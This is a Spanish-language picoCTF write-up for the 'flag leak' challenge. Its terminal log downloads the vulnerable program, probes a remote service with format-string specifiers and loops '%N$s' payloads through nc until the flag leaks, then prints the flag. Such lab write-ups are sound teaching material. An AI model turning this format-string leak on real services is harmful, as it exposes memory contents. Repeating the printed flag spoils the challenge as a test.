# flag leak
#picoCTF 
## Descripción
Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/92/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/92/vuln.c). And connect with it using: `nc saturn.picoctf.net 59857`

## Pistas 
+ Format Strings

## Solución
```bash 
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ wget https://artifacts.picoctf.net/c/92/vuln   
--2023-05-21 17:16:46--  https://artifacts.picoctf.net/c/92/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.22, 13.249.74.56, 13.249.74.69, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.22|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15876 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                         100%[==============================================>]  15.50K  --.-KB/s    in 0s      

2023-05-21 17:16:46 (51.6 MB/s) - ‘vuln’ saved [15876/15876]

                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ wget https://artifacts.picoctf.net/c/92/vuln.c
--2023-05-21 17:16:55--  https://artifacts.picoctf.net/c/92/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.69, 13.249.74.17, 13.249.74.22, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.69|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 947 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                       100%[==============================================>]     947  --.-KB/s    in 0s      

2023-05-21 17:16:55 (17.6 MB/s) - ‘vuln.c’ saved [947/947]

                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ ls
vuln  vuln.c
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ nano vuln.c
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ nc saturn.picoctf.net 59857
Tell me a story and then I'll tell you one >> %p %p %p %p
Here's a story - 
0xff9c29b0
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ nc saturn.picoctf.net 59857
Tell me a story and then I'll tell you one >> %x%x%x%x
Here's a story - 
ffea3db0ffea3dd0804934678257825
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ for i in {0..99}; do echo "%$i\$s" | nc saturn.picoctf.net 59857 | grep -Ei pico; done
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 59857 | grep -Ei (pico|CTF); done
CTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_
^C
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/flagleak]
└─$ 
```
## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}

## Notas adicionales
| comando | descripción |
|------------|---------------|
| xx | xx |

## Referencias
